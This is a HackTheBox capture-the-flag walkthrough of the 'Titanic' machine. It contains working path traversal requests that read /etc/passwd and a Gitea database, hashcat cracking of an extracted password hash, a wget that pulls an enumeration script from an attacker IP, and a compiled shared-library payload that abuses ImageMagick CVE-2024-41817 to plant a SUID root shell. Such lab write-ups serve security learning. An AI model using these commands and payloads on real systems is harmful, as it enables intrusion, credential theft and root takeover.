# Titanic — HackTheBox Writeup

**Difficulty:** Easy
**OS:** Linux
**IP:** 10.129.x.x  <!-- target IP -->

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Path Traversal — Ticket Download](#2-path-traversal--ticket-download)
3. [Finding the Gitea Database Path](#3-finding-the-gitea-database-path)
4. [Extracting and Cracking Hashes](#4-extracting-and-cracking-hashes)
5. [Initial Access — SSH](#5-initial-access--ssh)
6. [Privilege Escalation — ImageMagick CVE-2024-41817](#6-privilege-escalation--imagemagick-cve-2024-41817)

---

## 1. Reconnaissance

### TCP Scan
```bash
nmap -T4 -sV -Pn -n 10.129.x.x -v -sC
```

**Results:**
- Port 22 — OpenSSH
- Port 80 — HTTP

The web server redirected to `titanic.htb`. Added to `/etc/hosts`:
```bash
echo "10.129.x.x titanic.htb" >> /etc/hosts
```

### Web Enumeration

`titanic.htb` was a ship booking website. You fill in your details, hit submit, and it downloads a `.json` file with your booking info. Simple looking site — but I had Burp running in the background capturing every request. That habit matters more than the site looking boring.

Ran vhost fuzzing to check if other subdomains existed:
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://titanic.htb -H "Host: FUZZ.titanic.htb"
```

Found `dev.titanic.htb` — added to `/etc/hosts`:
```bash
echo "10.129.x.x dev.titanic.htb" >> /etc/hosts
```

This subdomain ran a **Gitea** instance — a self-hosted Git service, basically a private GitHub. I also did directory fuzzing on it and found a `/developer` path with a `docker-compose.yml` file inside. That file had MySQL credentials and also defined how the Gitea service was set up. Saved it for later.

> Always vhost fuzz. Internal tooling almost always lives on subdomains and is never meant to be public. Here it exposed source code, config files, and the entire Gitea setup.

---

## 2. Path Traversal — Ticket Download

Looking at Burp HTTP history after submitting the booking form, I saw this request:
```
GET /download?ticket=3f2a1c9b-xxxx-xxxx-xxxx-xxxxxxxxxxxx.json HTTP/1.1
Host: titanic.htb
```

The app is taking a filename directly from the URL and reading it off disk. There's no path validation happening — which means you can ask for files outside the intended directory. This is called **path traversal**.

Tested it in Burp Repeater by swapping the ticket value:
```
GET /download?ticket=/etc/passwd HTTP/1.1
Host: titanic.htb
```

Got the full `/etc/passwd` back. Two users had real login shells: `root` and `developer`.

> When you see a parameter that looks like it's referencing a file — ticket, file, doc, path, template — path traversal should be one of your first tests. The server has to explicitly block it, and a lot of developers forget to.

---

## 3. Finding the Gitea Database Path

I knew Gitea was running and I knew Gitea uses SQLite by default. So there's a `gitea.db` file somewhere on the machine. But guessing the exact path is unreliable — different installs, different versions, different paths.

The smarter move: run the same software yourself and see exactly where it puts things.

I already had the `docker-compose.yml` from the `/developer` directory on the Gitea instance. I downloaded it to my own machine and used it to spin up an identical Gitea container locally.

**Docker is a containerization tool** — think of it like a lightweight virtual machine. A `docker-compose.yml` file describes what container to run and how to configure it. Instead of installing Gitea manually, Docker pulls the image and runs it in seconds.
```bash
# download the docker-compose.yml from dev.titanic.htb using path traversal
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/docker-compose.yml' -o docker-compose.yml

# start the container in the background
docker compose up -d
```

Breaking down that command:
- `docker compose up` — reads the `docker-compose.yml` and starts the container
- `-d` stands for **detached** — runs the container in the background so it doesn't lock up your terminal. Without `-d` all the container logs flood your screen and you can't type anything
```bash
# check that the container is actually running
docker compose ps
```

This is like running `ps` for processes but for Docker containers. It shows you the container name, status, and ports. Confirmed Gitea was running.
```bash
# get a shell inside the running container
docker compose exec -it gitea bash
```

Breaking this down because it's important to understand:
- `docker compose exec` — run a command inside an already-running container. Think of the container as a separate mini Linux system running inside your machine. `exec` is how you reach inside it
- `-i` stands for **interactive** — keeps the input stream open so you can actually type commands
- `-t` stands for **tty** — allocates a proper terminal so you get a shell prompt with colors and everything working correctly. Without this you'd get raw output with no shell experience
- `-it` — these two are almost always used together whenever you want an interactive shell
- `gitea` — the name of the container to enter. This comes from the `services:` section in `docker-compose.yml` where the container is named `gitea`
- `bash` — the command to run inside the container. We're telling it to open a bash shell

Once inside the container I just explored the filesystem:
```bash
ls /data/
ls /data/gitea/
```

Found the database sitting right there at:
```
/data/gitea/gitea.db
```

Now I needed to map that container path back to the real host path. Looking at the `docker-compose.yml`:
```yaml
volumes:
  - /home/developer/gitea/data:/data
```

This line means: the `/data` directory inside the container is actually `/home/developer/gitea/data` on the real machine. So:
```
/data/gitea/gitea.db  →  /home/developer/gitea/data/gitea/gitea.db
```

Now I had the exact path. Used path traversal to grab it:
```bash
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
```

Downloaded.

> This is the right methodology when you don't know where an application stores its files. Don't guess — spin up the same software yourself, poke around inside it, and transfer that knowledge to the target. It takes a few extra minutes and completely eliminates guesswork.

---

## 4. Extracting and Cracking Hashes

### Extracting from the Database
```bash
sqlite3 gitea.db
sqlite> select * from user;
```

Three users found: `administrator`, `developer`, `test`. The hash format stored was `pbkdf2$50000$50` — PBKDF2-HMAC-SHA256 with 50000 iterations. Salt and hash are stored as separate fields in the database.

Hashcat needs them combined in a specific format. Used `gitea2hashcat.py` to handle the conversion automatically:
```bash
sqlite3 gitea.db 'select salt,passwd from user;' | python3 gitea2hashcat.py
```

**Output:**
```
[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)

sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:WmN1csngQLtvEk+KMPQ5tw==:OHKGkkkVw01rnBVBODBb9a+mXvbXcnsG6w9TlH4Y41+E2+vokxcVRTtISb/QNRSFW3c=
```

Saved all three to `hash.txt`.

### Cracking
```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

One cracked almost immediately:
```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rq...:25282528
```

That hash belonged to `developer`. Password: `25282528`

The other two didn't crack with rockyou — didn't need them anyway.

> PBKDF2 with 50000 iterations is slow by design — around 3800 hashes per second on CPU. One common mistake: forgetting to add the wordlist path to the hashcat command. Without it hashcat runs in stdin mode and just sits there waiting for input doing nothing. Always double check your command has the wordlist at the end.

---

## 5. Initial Access — SSH
```bash
ssh developer@10.129.x.x  # target IP
# password: 25282528
```

Grabbed the user flag:
```bash
cat ~/user.txt
```

---

## 6. Privilege Escalation — ImageMagick CVE-2024-41817

### Enumeration

Downloaded and ran LinEnum for general enumeration:
```bash
wget http://10.10.x.x:9090/LinEnum.sh  # attacker IP
chmod +x LinEnum.sh
./LinEnum.sh
```

Manually checked `/opt/`:
```bash
ls -al /opt/
```
```
drwxr-xr-x 5 root developer 4096 Feb 7 10:37 app
drwx--x--x 4 root root      4096 Feb 7 10:37 containerd
drwxr-xr-x 2 root root      4096 Feb 7 10:37 scripts
```

`/opt/app` is group-owned by `developer` — we have some access there. The `scripts` folder had a shell script worth reading:
```bash
cat /opt/scripts/identify_images.sh
```
```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

This script does three things: changes into the images directory, clears the log file, then runs `magick identify` on every jpg and saves the output. Watching the timestamp on `metadata.log` showed it updating every minute — root was running this on a cron job.

Checked which directories we could write to:
```bash
find /opt/app -type d -perm 770
```
```
/opt/app/static/assets/images
/opt/app/tickets
```

We can write to the exact directory the script runs from. That's the key piece.

### The Vulnerability
```bash
magick --version
```
```
Version: ImageMagick 7.1.1-35
```

Googling `ImageMagick 7.1.1-35 exploit` turned up **CVE-2024-41817**. The issue is how ImageMagick searches for shared libraries when it runs — it checks the **current working directory first** before looking in system paths like `/usr/lib`.

Shared libraries are `.so` files that programs load to use external functionality. Normally they live in system directories. But if a program checks the current directory first, and you control that directory, you can drop a fake library with the right name and the program will load yours instead of the real one.

In this case root's cron does `cd /opt/app/static/assets/images` then runs `magick`. We can write to that directory. So we drop a malicious `.so` file there with a name magick tries to load, wait for the cron to fire, and our code runs as root.

### Exploit

**Step 1 — Compile and drop the malicious library:**
```bash
cd /opt/app/static/assets/images

gcc -x c -shared -fPIC -o libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
}
EOF
```

What each part does:
- `gcc -x c` — compile the following as C code
- `-shared` — compile it as a shared library instead of a normal executable
- `-fPIC` — Position Independent Code, required for shared libraries
- `-o libxcb.so.1` — name the output `libxcb.so.1`, which is a library name ImageMagick looks for
- `__attribute__((constructor))` — a C feature that makes this function run automatically the moment the library gets loaded, before anything else happens. We don't need to be "called" — loading is enough
- The payload: copy bash to `/tmp/rootbash` and set the SUID bit. SUID means "run this file as its owner" — since root is running magick and root triggers the copy, root owns the file

**Step 2 — Wait about a minute** for the cron to fire.

Root's cron runs `magick` from the images directory. ImageMagick checks that directory for libraries first, finds our `libxcb.so.1`, loads it, and our constructor fires as root. `/tmp/rootbash` gets created with SUID set.

**Step 3 — Pop the root shell:**
```bash
/tmp/rootbash -p
```

The `-p` flag tells bash to preserve its elevated privileges. Bash has a security feature where it detects SUID and drops to your real user — `-p` disables that behavior and keeps the root context.

**Grabbed root flag:**
```bash
cat /root/root.txt
```

### What Happened Internally
```
root cron fires → runs magick in /opt/app/static/assets/images
        ↓
ImageMagick searches current directory for libraries first (CVE-2024-41817)
        ↓
finds our libxcb.so.1 instead of the legitimate system library
        ↓
loads it → __attribute__((constructor)) fires automatically as root
        ↓
system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
        ↓
/tmp/rootbash -p → root shell
```
